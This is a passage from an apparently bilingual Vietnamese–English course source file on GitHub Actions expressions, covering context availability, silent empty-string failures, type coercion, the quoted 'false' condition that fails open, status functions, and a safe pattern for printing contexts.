<div class="out">secrets  44   env      9   runner    5   matrix   4
inputs    4   steps    3   github    3   hashFiles 2
                                      tong: 74 bieu thuc</div>

<p>Hai điều rơi ra từ phân bố ấy. Bí mật chiếm 59% tổng số biểu thức ở đây — vì workflow của kho này chủ yếu đi deploy, và deploy nghĩa là thông tin đăng nhập. Còn context <code>github</code>, cái mà người ta viết về nhiều nhất, xuất hiện ba lần. Trong workflow thật, biểu thức áp đảo là về <em>CẤU HÌNH BẠN CUNG CẤP</em>, chứ không phải về sự kiện.</p>

<div class="out">secrets.VPS_HOST              18
secrets.VPS_USER               9
secrets.VPS_SSH_PRIVATE_KEY    9
runner.os                      5
secrets.RELEASE_TOKEN          4
inputs.version                 4
env.FRONTEND_IMAGE             4
env.BACKEND_IMAGE              4
steps.tag.outputs.tag          3
matrix.ten                     2
github.sha                     2</div>

<h3>Các context, và mỗi cái dùng được ở đâu</h3>
<div class="lz-stack">
<div class="lz-layer"><span class="lz-lname"><code>github</code></span><span class="lz-lnote">sự kiện và kho: <code>sha</code>, <code>ref</code>, <code>event_name</code>, <code>actor</code>, <code>repository</code>, và trọn gói dữ liệu thô nằm dưới <code>github.event</code>. Dùng được gần như mọi nơi. Cũng là context nhiều khả năng chứa thứ một người lạ gõ vào nhất — xem bài 3.1</span></div>
<div class="lz-layer"><span class="lz-lname"><code>secrets</code></span><span class="lz-lnote">bí mật của kho, của môi trường và của tổ chức, cộng với <code>GITHUB_TOKEN</code> tự động. <strong>Không dùng được trong <code>on:</code></strong>, và bị che trong log thành <code>***</code></span></div>
<div class="lz-layer"><span class="lz-lname"><code>env</code></span><span class="lz-lnote">các biến đặt bằng <code>env:</code> ở mức workflow, job hay bước. Không dùng được trong chính cái khối <code>env:</code> định nghĩa ra nó, và không dùng được trong <code>runs-on:</code> ở mức job — một hạn chế làm bất ngờ những ai định TÍNH ra một nhãn runner</span></div>
<div class="lz-layer"><span class="lz-lname"><code>runner</code></span><span class="lz-lnote"><code>os</code>, <code>arch</code>, <code>temp</code>, <code>tool_cache</code>. Chỉ có bên trong một job — nó mô tả một cỗ máy, mà ngoài job thì không có cỗ máy nào. Đó là lý do nó chạy được trong một khoá cache mà không chạy được trong <code>on:</code></span></div>
<div class="lz-layer"><span class="lz-lname"><code>matrix</code></span><span class="lz-lnote">chỉ trong một job có <code>strategy.matrix</code>. Mọi khoá bạn viết trong mục ma trận, kể cả những cái bạn tự bịa ra như <code>ten</code> và <code>lenh</code> ở bài 2.5</span></div>
<div class="lz-layer"><span class="lz-lname"><code>needs</code></span><span class="lz-lnote"><code>needs.&lt;job&gt;.result</code> và <code>needs.&lt;job&gt;.outputs.&lt;tên&gt;</code>. Chỉ cho những job thật sự có tên trong <code>needs:</code> của job này — một job bạn không khai phụ thuộc thì đơn giản là không có ở đó</span></div>
<div class="lz-layer"><span class="lz-lname"><code>steps</code></span><span class="lz-lnote"><code>steps.&lt;id&gt;.outputs.&lt;tên&gt;</code>, <code>.outcome</code>, <code>.conclusion</code>. Chỉ cho những bước CÓ <code>id:</code>, và chỉ cho những bước ĐÃ CHẠY trong job này</span></div>
<div class="lz-layer"><span class="lz-lname"><code>inputs</code></span><span class="lz-lnote">từ tham số của <code>workflow_dispatch</code> hoặc tham số <code>workflow_call</code> của một workflow dùng lại. Mười trên mười một workflow của kho này chỉ chạy tay, và đó là lý do <code>inputs</code> xuất hiện ngang tần suất với <code>matrix</code></span></div>
<div class="lz-layer"><span class="lz-lname"><code>job</code> · <code>vars</code> · <code>strategy</code></span><span class="lz-lnote"><code>job.status</code> và chi tiết container dịch vụ; <code>vars</code> cho biến cấu hình không bí mật; <code>strategy.job-index</code> và <code>fail-fast</code>. Ít khi cần, nhưng <code>vars</code> mới là chỗ đúng cho một giá trị không bí mật mà bạn hay biến thành secret theo thói quen</span></div>
</div>

<div class="callout warn">
<p><strong>Một context không dùng được thì KHÔNG báo lỗi. Nó tính ra RỖNG.</strong> <code>\${{ steps.khong-co.outputs.x }}</code> là chuỗi rỗng, và <code>\${{ matrix.os }}</code> trong một job không có ma trận cũng vậy. Nghĩa là một id bước gõ sai sẽ đẻ ra một bước chạy với một tham số trống và thường thành công trong việc chẳng làm gì — đúng cái hình dạng hỏng sống sót qua review, qua CI, và bị tìm thấy ở production. Khi một biểu thức cho ra rỗng, nghi phạm đầu tiên là TÍNH KHẢ DỤNG, không phải giá trị.</p>
</div>

<h3>Context <code>steps</code> cần HAI thứ mà bạn phải nhớ viết</h3>
<pre><code>- name: Xac dinh the phien ban
  id: tag                          <span class="tok-comment"># 1. phai co id:</span>
  run: echo "tag=v1.2.3" &gt;&gt; \$GITHUB_OUTPUT   <span class="tok-comment"># 2. phai ghi vao GITHUB_OUTPUT</span>

- name: Dung the do
  run: echo "\${{ steps.tag.outputs.tag }}"</code></pre>

<p>Thiếu <code>id:</code> thì bước ấy không có tên trong context. Thiếu lượt ghi vào <code>\$GITHUB_OUTPUT</code> thì bước có tồn tại nhưng không có output nào. Cả hai đẻ ra cùng một triệu chứng — một chuỗi rỗng — và kho này dùng đúng khuôn mẫu này ba lần, cả ba đều cho một thẻ phiên bản.</p>

<div class="pitfall">
<p><strong>Bẫy — <code>outcome</code> và <code>conclusion</code> KHÔNG phải cùng một giá trị.</strong> <code>steps.&lt;id&gt;.outcome</code> là kết quả <em>TRƯỚC</em> khi áp <code>continue-on-error</code>; <code>conclusion</code> là kết quả <em>SAU</em>. Nên với một bước gắn <code>continue-on-error: true</code> mà hỏng, <code>outcome</code> là <code>failure</code> còn <code>conclusion</code> là <code>success</code>. Nếu bạn muốn một bước sau phản ứng với cú hỏng THẬT của một bước được dung thứ — mà đó chính là toàn bộ lý do để dung thứ rồi báo cáo — thì bạn phải đọc <code>outcome</code>. Đọc <code>conclusion</code> cho bạn một điều kiện không bao giờ đúng, một cách âm thầm.</p>
</div>

<h3>Chỗ mà một context hoàn toàn không tồn tại</h3>
<div class="kv-grid">
<div class="kv"><span class="k">khối <code>on:</code></span><span class="v">không gì dùng được cả. Kích hoạt, bộ lọc nhánh và lịch cron được đọc trước khi có một sự kiện, một job hay một runner. Đây không phải một hạn chế cần lách — nó là lý do một workflow được lập chỉ mục và lên lịch được mà không cần chạy nó</span></div>
<div class="kv"><span class="k"><code>runs-on:</code> ở mức job</span><span class="v"><code>matrix</code> chạy được — đó là cách ba nền tảng ở bài 2.5 xảy ra — nhưng <code>env</code> thì không. Hãy tính nhãn trong ma trận, đừng tính trong một khối <code>env:</code></span></div>
<div class="kv"><span class="k">một khối <code>env:</code> tự tham chiếu chính nó</span><span class="v"><code>env: {A: 1, B: \${{ env.A }}}</code> không chạy. Trong cùng một khối các giá trị không được xếp thứ tự; hãy đặt <code>B</code> ở một phạm vi sau, hoặc viết thẳng ra</span></div>
<div class="kv"><span class="k">bí mật của một workflow dùng lại</span><span class="v">một workflow được gọi KHÔNG tự động thừa kế <code>secrets</code>. Nó nhận thứ bạn truyền dưới <code>secrets:</code>, hoặc toàn bộ với <code>secrets: inherit</code> — và cái mặc định truyền-không-gì lại đẻ ra, một lần nữa, chuỗi rỗng chứ không phải lỗi</span></div>
</div>

<h3>Đọc một context mà bạn chưa thuộc</h3>
<p>Trọn vẹn bất kỳ context nào cũng in ra được, và làm thế đúng một lần cho cái sự kiện đang làm bạn rối thì nhanh hơn đọc tài liệu:</p>

<pre><code>- name: Do context ra xem
  run: |
    echo "\$GITHUB_CONTEXT"
    echo "\$NEEDS_CONTEXT"
  env:
    GITHUB_CONTEXT: \${{ toJSON(github) }}
    NEEDS_CONTEXT: \${{ toJSON(needs) }}</code></pre>

<div class="callout ok">
<p><strong>Để ý cái hình dạng: qua <code>env:</code>, không đổ thẳng vào <code>run:</code>.</strong> <code>toJSON(github)</code> chứa trọn gói dữ liệu sự kiện — kể cả tiêu đề PR, tên nhánh, và thông điệp commit mà bài 3.1 đã cho thấy là do kẻ tấn công kiểm soát. Đổ nó thẳng vào một khối <code>run:</code> là chính cái lỗi injection với phần tải được chọn sẵn cho bạn. Kỹ thuật gỡ lỗi và kỹ thuật an toàn là cùng hai dòng thêm vào ấy.</p>
</div>

<div class="callout">
<p><strong>Một câu.</strong> Context hỏng bằng cách VẮNG MẶT chứ không bằng cách sai, nên khi một biểu thức cho ra rỗng, hãy kiểm <em>CHỖ</em> bạn viết nó trước khi kiểm <em>CÁI</em> bạn viết.</p>
</div>

<h3>Nguồn</h3>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">GitHub Docs — Contexts</span><span class="lc-sub">docs.github.com/en/actions/learn-github-actions/contexts — mọi context, mọi thuộc tính, và cái bảng khả dụng nói context nào dùng được trong khoá nào. Bảng đó là đáp án cho phần lớn câu hỏi "vì sao biểu thức của tôi rỗng".</span></span></div>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">GitHub Docs — Webhook events and payloads</span><span class="lc-sub">docs.github.com/en/webhooks/webhook-events-and-payloads — thật sự có gì bên trong <code>github.event</code> cho từng kích hoạt. Hình dạng khác nhau theo sự kiện, và đó là lý do một workflow đọc <code>github.event.pull_request</code> nhận được con số không khi có push.</span></span></div>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">GitHub Docs — Variables: configuration variables (vars)</span><span class="lc-sub">docs.github.com/en/actions/learn-github-actions/variables#defining-configuration-variables-for-multiple-workflows — context <code>vars</code>, dành cho những giá trị cần cấu hình được nhưng không nhạy cảm và không nên bị che trong log.</span></span></div>
<div class="link-card codelab"><span class="lc-ico">🧪</span><span class="lc-body"><span class="lc-title">TypeScript — optional chaining, và cái giá trị âm thầm undefined</span><span class="lc-sub">/courses/typescript/learn${REF} — cùng lớp lỗi ở một ngôn ngữ khác: một phép tra cứu trả về rỗng thay vì báo hỏng, và kỷ luật làm cho sự VẮNG MẶT hiện ra ngay ở biên.</span></span></div>
</div>
`,
    },

    /* ─────────────────────────── 3.3 ─────────────────────────── */
    {
      title: '3.3 — Operators, coercion, and the condition that fails open|||3.3 — Toán tử, ép kiểu, và điều kiện hỏng theo hướng MỞ',
      slug: 'ga-3-3-ep-kieu',
      type: 'VIDEO',
      description: 'Đo bằng bộ đọc YAML thật: `if: false` tới bộ máy biểu thức dưới dạng BOOLEAN, `if: \'false\'` tới dưới dạng CHUỖI — và chuỗi khác rỗng là ĐÚNG, nên bước CHẠY. Một cặp nháy biến một điều kiện tắt thành một điều kiện bật.',
      content: `
<div class="ml-en">
<span class="eyebrow">Chapter 3 · Lesson 3.3</span>
<h2>Operators, coercion, and the condition that fails open</h2>
<p class="lead">The expression language is small: comparison, logic, a handful of functions. What makes it worth a lesson is that it coerces types before comparing, and the coercion produces one specific outcome that turns a disabled step back on.</p>

<h3>The operators</h3>
<div class="kv-grid">
<div class="kv"><span class="k">comparison</span><span class="v"><code>==</code> <code>!=</code> <code>&lt;</code> <code>&lt;=</code> <code>&gt;</code> <code>&gt;=</code>. There is no strict-equality operator — <code>==</code> always coerces first</span></div>
<div class="kv"><span class="k">logic</span><span class="v"><code>&amp;&amp;</code> <code>||</code> <code>!</code>. These return one of their <em>operands</em>, not a boolean, so <code>a || b</code> is a usable default-value idiom</span></div>
<div class="kv"><span class="k">access</span><span class="v"><code>a.b</code>, <code>a['b']</code>, <code>a[0]</code>, and <code>a.*</code> which collects a property from every element of an array</span></div>
<div class="kv"><span class="k">grouping</span><span class="v">parentheses. Worth using freely — <code>&amp;&amp;</code> binds tighter than <code>||</code> and a mixed condition is easy to misread</span></div>
</div>

<h3>Coercion, as documented</h3>
<p>Before comparing two values of different types, both are converted to numbers. The rules are published rather than measurable from outside GitHub, so this table is from the documentation:</p>

<div class="out">gia tri        -> so
-----------------------------
null           -> 0
true           -> 1
false          -> 0
''             -> 0
'123'          -> 123
'0x1'          -> 1        (dang so hop le)
'abc'          -> NaN
mang / doi tuong -> NaN</div>

<p>Coercion only happens when the two sides are <em>different</em> types — <code>'abc' == 'abc'</code> is a plain string comparison and is true. It is the mixed comparison that surprises: <code>'abc' == 0</code> coerces the left side to <code>NaN</code>, and <code>NaN</code> is unequal to everything, so the result is false no matter what number you put on the right. The rule worth holding on to is simpler than the table: <strong>a comparison that mixes a string with a number is answering a question you did not ask.</strong> Compare strings to strings.</p>

<div class="callout">
<p><strong>Truthiness, which is the part that matters:</strong> the values that are <em>false</em> are <code>false</code>, <code>0</code>, <code>-0</code>, <code>''</code>, and <code>null</code>. Everything else is true. In particular the string <code>'false'</code> is true, the string <code>'0'</code> is true, and an empty array is true.</p>
</div>

<h3>The measurement: what <code>if:</code> actually receives</h3>
<p>Before the expression engine sees anything, YAML has already parsed the file — so the type of an <code>if:</code> value is decided by the YAML parser, not by you. Run a real parser over the forms people write:</p>

<div class="out">viet trong if:                  YAML doc ra           kieu
--------------------------------------------------------------
false                           False                 bool
'false'                         'false'               str
"false"                         'false'               str
0                               0                     int
'0'                             '0'                   str
''                              ''                    str
null                            None                  NoneType
~                               None                  NoneType
no                              False                 bool
off                             False                 bool
\${{ false }}                    '\${{ false }}'        str</div>

<div class="callout warn">
<p><strong>The two lines that matter are the first two.</strong> <code>if: false</code> arrives at the expression engine as a boolean and the step is skipped. <code>if: 'false'</code> arrives as the string <code>false</code>, which is non-empty, which is <strong>true</strong> — and the step runs. One pair of quotes flips a disabled step back on, and it flips it on <em>silently</em>: the step succeeds, the job is green, and nothing in the log says a condition was misread.</p>
</div>

<div class="pitfall">
<p><strong>Bẫy — the condition that fails open.</strong> Most configuration mistakes fail closed: a typo means something does not happen. This one fails <em>open</em> — the mistake means something happens that you intended to prevent. That asymmetry is why it deserves its own habit: any <code>if:</code> meant to disable something should be checked by looking at whether the step was skipped in a real run, not by reading the YAML. The run page shows skipped steps explicitly; the file does not.</p>
</div>

<p>Notice also the last two rows before the expression: <code>no</code> and <code>off</code> parse to boolean <code>False</code> — the same YAML 1.1 rule that turns the <code>on:</code> key into a boolean in lesson 1.1. A step written <code>if: off</code> is correctly disabled, but for a reason that has nothing to do with the expression language, and it would stop being disabled under a YAML 1.2 parser.</p>

<h3>Default values with <code>||</code></h3>
<p>Because <code>||</code> returns an operand rather than a boolean, it is the idiomatic way to supply a fallback:</p>

<pre><code><span class="tok-comment"># neu inputs.version rong thi lay 'latest'</span>
tag: \${{ inputs.version || 'latest' }}

<span class="tok-comment"># chon theo nhanh</span>
moi_truong: \${{ github.ref == 'refs/heads/main' &amp;&amp; 'production' || 'staging' }}</code></pre>

<div class="pitfall">
<p><strong>Bẫy — the ternary idiom breaks when the middle value is falsy.</strong> <code>cond &amp;&amp; A || B</code> reads like <code>cond ? A : B</code> and behaves like it <em>only while <code>A</code> is truthy</em>. Write <code>cond &amp;&amp; '' || 'x'</code> and you get <code>'x'</code> whatever <code>cond</code> is, because the empty string is falsy and falls through to the right-hand side. The same trap exists with <code>0</code> and with <code>false</code>. When the true-branch value can be empty, use an explicit <code>if:</code> on the step instead of a clever expression.</p>
</div>

<h3>Status functions, which only exist in <code>if:</code></h3>
<div class="lz-stack">
<div class="lz-layer"><span class="lz-lname"><code>success()</code></span><span class="lz-lnote">true when nothing has failed so far. This is the <strong>implicit default</strong> on every step and job — writing it changes nothing</span></div>
<div class="lz-layer"><span class="lz-lname"><code>failure()</code></span><span class="lz-lnote">true when something earlier failed. Right for a notification step; wrong for log collection, which you want either way</span></div>
<div class="lz-layer"><span class="lz-lname"><code>always()</code></span><span class="lz-lnote">true unconditionally — including after a cancel. Correct for uploading test reports; dangerous on anything that touches the outside world</span></div>
<div class="lz-layer"><span class="lz-lname"><code>cancelled()</code></span><span class="lz-lnote">true when the run was cancelled. <code>\${{ !cancelled() }}</code> is what most people mean when they write <code>always()</code>, and it is the safer of the two</span></div>
</div>

<div class="callout warn">
<p><strong>Any status function in a condition replaces the implicit <code>success()</code>.</strong> So <code>if: always() &amp;&amp; github.ref == 'refs/heads/main'</code> runs on the main branch <em>even when an earlier step failed</em> — which is nearly always not what was intended. If you want "on main, and only if things are fine", the condition is just <code>if: github.ref == 'refs/heads/main'</code>, because <code>success()</code> is already there.</p>
</div>

<h3>Comparing things that are not strings</h3>
<p>Two comparisons come up constantly and both have a right form:</p>

<div class="kv-grid">
<div class="kv"><span class="k">branch</span><span class="v"><code>github.ref == 'refs/heads/main'</code>, not <code>== 'main'</code>. <code>github.ref</code> is a full ref; on a pull request it is <code>refs/pull/&lt;N&gt;/merge</code>, as lesson 1.4 measured</span></div>
<div class="kv"><span class="k">"is this a tag"</span><span class="v"><code>startsWith(github.ref, 'refs/tags/')</code>. There is no <code>github.tag</code></span></div>
<div class="kv"><span class="k">a job&#39;s result</span><span class="v"><code>needs.&lt;job&gt;.result == 'success'</code> — the values are <code>success</code>, <code>failure</code>, <code>cancelled</code>, <code>skipped</code>, as strings</span></div>
<div class="kv"><span class="k">a boolean <code>workflow_dispatch</code> input</span><span class="v">arrives as the <strong>string</strong> <code>'true'</code> or <code>'false'</code>. So <code>if: inputs.co_deploy</code> is true in both cases — compare it: <code>if: inputs.co_deploy == 'true'</code></span></div>
</div>

<div class="callout ok">
<p><strong>The one sentence.</strong> Everything reaches an expression as a string unless YAML made it something else first, and since a non-empty string is true, the two habits that prevent nearly all of these bugs are: compare explicitly rather than relying on truthiness, and confirm a disabling condition by looking at a real run rather than at the file.</p>
</div>

<h3>Sources</h3>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">GitHub Docs — Expressions: operators and type casting</span><span class="lc-sub">docs.github.com/en/actions/learn-github-actions/expressions#operators — the operator precedence table and the exact coercion rules reproduced above, including the NaN cases.</span></span></div>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">GitHub Docs — Expressions: status check functions</span><span class="lc-sub">docs.github.com/en/actions/learn-github-actions/expressions#status-check-functions — the four status functions, and the statement that using any of them removes the implicit <code>success()</code>.</span></span></div>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">YAML 1.1 type resolution — the bool schema</span><span class="lc-sub">yaml.org/type/bool.html — the list that makes <code>no</code>, <code>off</code> and <code>on</code> booleans. The same page explains lesson 1.1&#39;s <code>on:</code> key, and it explains the last rows of the table above.</span></span></div>
<div class="link-card codelab"><span class="lc-ico">🧪</span><span class="lc-body"><span class="lc-title">TypeScript — == versus ===, and why coercion tables get memorised</span><span class="lc-sub">/courses/typescript/learn${REF} — the same design decision in a language where you are given a way out; Actions has no strict-equality operator, so the discipline has to come from you.</span></span></div>
</div>
<div class="ml-vi">
<span class="eyebrow">Chương 3 · Bài 3.3</span>
<h2>Toán tử, ép kiểu, và điều kiện hỏng theo hướng MỞ</h2>
<p class="lead">Ngôn ngữ biểu thức nhỏ thôi: so sánh, logic, một nhúm hàm. Thứ khiến nó đáng một bài là nó ÉP KIỂU trước khi so sánh, và phép ép kiểu ấy đẻ ra đúng một kết cục biến một bước đã tắt thành bật lại.</p>

<h3>Các toán tử</h3>
<div class="kv-grid">
<div class="kv"><span class="k">so sánh</span><span class="v"><code>==</code> <code>!=</code> <code>&lt;</code> <code>&lt;=</code> <code>&gt;</code> <code>&gt;=</code>. KHÔNG có toán tử so sánh nghiêm ngặt — <code>==</code> luôn ép kiểu trước</span></div>
<div class="kv"><span class="k">logic</span><span class="v"><code>&amp;&amp;</code> <code>||</code> <code>!</code>. Mấy cái này trả về một trong các <em>TOÁN HẠNG</em> của chúng chứ không trả về boolean, nên <code>a || b</code> là một lối viết giá-trị-mặc-định dùng được</span></div>
<div class="kv"><span class="k">truy cập</span><span class="v"><code>a.b</code>, <code>a['b']</code>, <code>a[0]</code>, và <code>a.*</code> gom một thuộc tính từ mọi phần tử của một mảng</span></div>
<div class="kv"><span class="k">gộp nhóm</span><span class="v">dấu ngoặc đơn. Đáng dùng thoải mái — <code>&amp;&amp;</code> gắn chặt hơn <code>||</code> và một điều kiện trộn thì rất dễ đọc nhầm</span></div>
</div>

<h3>Ép kiểu, theo tài liệu</h3>
<p>Trước khi so sánh hai giá trị khác kiểu, cả hai được chuyển thành SỐ. Các luật này được công bố chứ không đo được từ bên ngoài GitHub, nên bảng dưới đây lấy từ tài liệu:</p>

<div class="out">gia tri        -> so
-----------------------------
null           -> 0
true           -> 1
false          -> 0
''             -> 0
'123'          -> 123
'0x1'          -> 1        (dang so hop le)
'abc'          -> NaN
mang / doi tuong -> NaN</div>

<p>Ép kiểu chỉ xảy ra khi hai phía <em>KHÁC</em> kiểu — <code>'abc' == 'abc'</code> là một phép so sánh chuỗi thuần và nó đúng. Chính phép so sánh TRỘN mới gây bất ngờ: <code>'abc' == 0</code> ép phía trái thành <code>NaN</code>, mà <code>NaN</code> thì khác mọi thứ, nên kết quả là SAI bất kể bạn đặt số nào bên phải. Quy tắc đáng giữ đơn giản hơn cả cái bảng: <strong>một phép so sánh trộn chuỗi với số là đang trả lời một câu hỏi bạn không hề hỏi.</strong> Hãy so chuỗi với chuỗi.</p>

<div class="callout">
<p><strong>Tính đúng-sai, và đây mới là phần quan trọng:</strong> những giá trị SAI là <code>false</code>, <code>0</code>, <code>-0</code>, <code>''</code>, và <code>null</code>. Mọi thứ khác là ĐÚNG. Đặc biệt, chuỗi <code>'false'</code> là ĐÚNG, chuỗi <code>'0'</code> là ĐÚNG, và một mảng rỗng cũng là ĐÚNG.</p>
</div>

<h3>Phép đo: <code>if:</code> thật ra NHẬN cái gì</h3>
<p>Trước khi bộ máy biểu thức nhìn thấy bất cứ thứ gì, YAML đã đọc xong tệp — nên KIỂU của một giá trị <code>if:</code> do bộ đọc YAML quyết định, không phải do bạn. Chạy một bộ đọc thật lên các cách viết mà người ta hay dùng:</p>

<div class="out">viet trong if:                  YAML doc ra           kieu
--------------------------------------------------------------
false                           False                 bool
'false'                         'false'               str
"false"                         'false'               str
0                               0                     int
'0'                             '0'                   str
''                              ''                    str
null                            None                  NoneType
~                               None                  NoneType
no                              False                 bool
off                             False                 bool
\${{ false }}                    '\${{ false }}'        str</div>

<div class="callout warn">
<p><strong>Hai dòng quan trọng là hai dòng đầu.</strong> <code>if: false</code> tới bộ máy biểu thức dưới dạng một boolean và bước bị bỏ qua. <code>if: 'false'</code> tới dưới dạng chuỗi <code>false</code>, chuỗi ấy khác rỗng, tức là <strong>ĐÚNG</strong> — và bước CHẠY. Một cặp nháy lật một bước đã tắt thành bật lại, và nó lật một cách <em>ÂM THẦM</em>: bước thành công, job xanh, và không có gì trong log nói rằng một điều kiện đã bị đọc sai.</p>
</div>

<div class="pitfall">
<p><strong>Bẫy — điều kiện hỏng theo hướng MỞ.</strong> Phần lớn lỗi cấu hình hỏng theo hướng ĐÓNG: gõ sai một chữ thì một việc gì đó không xảy ra. Cái này hỏng theo hướng <em>MỞ</em> — lỗi khiến một việc bạn định NGĂN lại xảy ra. Sự bất đối xứng ấy là lý do nó đáng có một thói quen riêng: mọi <code>if:</code> nhằm TẮT một thứ gì đó đều phải được kiểm bằng cách nhìn xem bước có bị bỏ qua trong một lần chạy thật hay không, chứ không phải bằng cách đọc YAML. Trang lần chạy hiện rõ các bước bị bỏ qua; tệp thì không.</p>
</div>

<p>Cũng để ý hai dòng gần cuối: <code>no</code> và <code>off</code> đọc ra boolean <code>False</code> — đúng cái luật YAML 1.1 biến khoá <code>on:</code> thành boolean ở bài 1.1. Một bước viết <code>if: off</code> thì bị tắt đúng, nhưng vì một lý do chẳng liên quan gì tới ngôn ngữ biểu thức, và nó sẽ THÔI bị tắt dưới một bộ đọc YAML 1.2.</p>

<h3>Giá trị mặc định với <code>||</code></h3>
<p>Vì <code>||</code> trả về một toán hạng chứ không trả về boolean, nó là cách viết quen thuộc để cấp một giá trị dự phòng:</p>

<pre><code><span class="tok-comment"># neu inputs.version rong thi lay 'latest'</span>
tag: \${{ inputs.version || 'latest' }}

<span class="tok-comment"># chon theo nhanh</span>
moi_truong: \${{ github.ref == 'refs/heads/main' &amp;&amp; 'production' || 'staging' }}</code></pre>

<div class="pitfall">
<p><strong>Bẫy — lối viết ba ngôi VỠ khi giá trị ở giữa là SAI.</strong> <code>cond &amp;&amp; A || B</code> đọc lên như <code>cond ? A : B</code> và cư xử đúng như thế <em>CHỈ KHI <code>A</code> là ĐÚNG</em>. Viết <code>cond &amp;&amp; '' || 'x'</code> thì bạn nhận <code>'x'</code> bất kể <code>cond</code> là gì, vì chuỗi rỗng là SAI nên nó rơi xuống phía bên phải. Cùng cái bẫy ấy có với <code>0</code> và với <code>false</code>. Khi giá trị của nhánh-đúng có thể rỗng, hãy dùng một <code>if:</code> tường minh trên bước thay vì một biểu thức khôn khéo.</p>
</div>

<h3>Hàm trạng thái, chỉ tồn tại trong <code>if:</code></h3>
<div class="lz-stack">
<div class="lz-layer"><span class="lz-lname"><code>success()</code></span><span class="lz-lnote">đúng khi chưa có gì hỏng. Đây là <strong>MẶC ĐỊNH NGẦM</strong> trên mọi bước và mọi job — viết nó ra chẳng đổi gì</span></div>
<div class="lz-layer"><span class="lz-lname"><code>failure()</code></span><span class="lz-lnote">đúng khi có thứ gì trước đó hỏng. Đúng cho một bước gửi thông báo; sai cho việc thu thập log, thứ bạn muốn có trong cả hai trường hợp</span></div>
<div class="lz-layer"><span class="lz-lname"><code>always()</code></span><span class="lz-lnote">đúng vô điều kiện — kể cả sau khi bị huỷ. Đúng cho việc tải báo cáo test lên; NGUY HIỂM với bất cứ thứ gì chạm ra thế giới bên ngoài</span></div>
<div class="lz-layer"><span class="lz-lname"><code>cancelled()</code></span><span class="lz-lnote">đúng khi lần chạy bị huỷ. <code>\${{ !cancelled() }}</code> mới là thứ phần lớn người ta muốn khi họ viết <code>always()</code>, và nó an toàn hơn trong hai cái</span></div>
</div>

<div class="callout warn">
<p><strong>Bất kỳ hàm trạng thái nào trong một điều kiện đều THAY THẾ cái <code>success()</code> ngầm định.</strong> Nên <code>if: always() &amp;&amp; github.ref == 'refs/heads/main'</code> sẽ chạy trên nhánh main <em>KỂ CẢ KHI một bước trước đó đã hỏng</em> — và đó gần như luôn không phải điều được định. Nếu bạn muốn "trên main, và chỉ khi mọi thứ ổn", thì điều kiện chỉ là <code>if: github.ref == 'refs/heads/main'</code>, bởi <code>success()</code> vốn đã có sẵn ở đó.</p>
</div>

<h3>So sánh những thứ không phải chuỗi</h3>
<p>Hai phép so sánh gặp liên tục và cả hai đều có một dạng đúng:</p>

<div class="kv-grid">
<div class="kv"><span class="k">nhánh</span><span class="v"><code>github.ref == 'refs/heads/main'</code>, không phải <code>== 'main'</code>. <code>github.ref</code> là một ref đầy đủ; trên một pull request nó là <code>refs/pull/&lt;N&gt;/merge</code>, như bài 1.4 đã đo</span></div>
<div class="kv"><span class="k">"đây có phải một tag không"</span><span class="v"><code>startsWith(github.ref, 'refs/tags/')</code>. Không có <code>github.tag</code></span></div>
<div class="kv"><span class="k">kết quả của một job</span><span class="v"><code>needs.&lt;job&gt;.result == 'success'</code> — các giá trị là <code>success</code>, <code>failure</code>, <code>cancelled</code>, <code>skipped</code>, dạng CHUỖI</span></div>
<div class="kv"><span class="k">một tham số boolean của <code>workflow_dispatch</code></span><span class="v">tới nơi dưới dạng <strong>CHUỖI</strong> <code>'true'</code> hoặc <code>'false'</code>. Nên <code>if: inputs.co_deploy</code> là ĐÚNG trong cả hai trường hợp — hãy so sánh nó: <code>if: inputs.co_deploy == 'true'</code></span></div>
</div>

<div class="callout ok">
<p><strong>Một câu.</strong> Mọi thứ tới một biểu thức dưới dạng chuỗi trừ khi YAML đã biến nó thành thứ khác trước, và vì một chuỗi khác rỗng là ĐÚNG, hai thói quen ngăn được gần hết những lỗi này là: SO SÁNH tường minh thay vì dựa vào tính đúng-sai, và XÁC NHẬN một điều kiện tắt bằng cách nhìn một lần chạy thật chứ không nhìn tệp.</p>
</div>

<h3>Nguồn</h3>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">GitHub Docs — Expressions: operators and type casting</span><span class="lc-sub">docs.github.com/en/actions/learn-github-actions/expressions#operators — bảng độ ưu tiên toán tử và đúng những luật ép kiểu chép lại bên trên, gồm cả các ca NaN.</span></span></div>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">GitHub Docs — Expressions: status check functions</span><span class="lc-sub">docs.github.com/en/actions/learn-github-actions/expressions#status-check-functions — bốn hàm trạng thái, và phát biểu rằng dùng bất kỳ cái nào cũng gỡ mất cái <code>success()</code> ngầm định.</span></span></div>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">YAML 1.1 type resolution — lược đồ bool</span><span class="lc-sub">yaml.org/type/bool.html — cái danh sách biến <code>no</code>, <code>off</code> và <code>on</code> thành boolean. Cùng trang ấy giải thích khoá <code>on:</code> của bài 1.1, và nó giải thích mấy dòng cuối của bảng bên trên.</span></span></div>
<div class="link-card codelab"><span class="lc-ico">🧪</span><span class="lc-body"><span class="lc-title">TypeScript — == với ===, và vì sao bảng ép kiểu bị đem đi học thuộc</span><span class="lc-sub">/courses/typescript/learn${REF} — cùng một quyết định thiết kế ở một ngôn ngữ có cho bạn lối thoát; Actions không có toán tử so sánh nghiêm ngặt, nên kỷ luật phải tới từ chính bạn.</span></span></div>
</div>
`,
    },

    /* ─────────────────────────── 3.4 ─────────────────────────── */
    {
      title: '3.4 — Functions, and hashFiles() reproduced exactly|||3.4 — Hàm, và hashFiles() tái lập KHỚP CHÍNH XÁC',
      slug: 'ga-3-4-ham',
      type: 'VIDEO',
      description: 'Tái lập `hashFiles()` bằng 6 dòng Python rồi đối chiếu với log thật của job 85355071479 — KHỚP tới từng ký tự hex. Cộng `fromJSON` để tính ma trận lúc chạy, và `format()` thay cho việc ghép chuỗi.',
      content: `
<div class="ml-en">
<span class="eyebrow">Chapter 3 · Lesson 3.4</span>
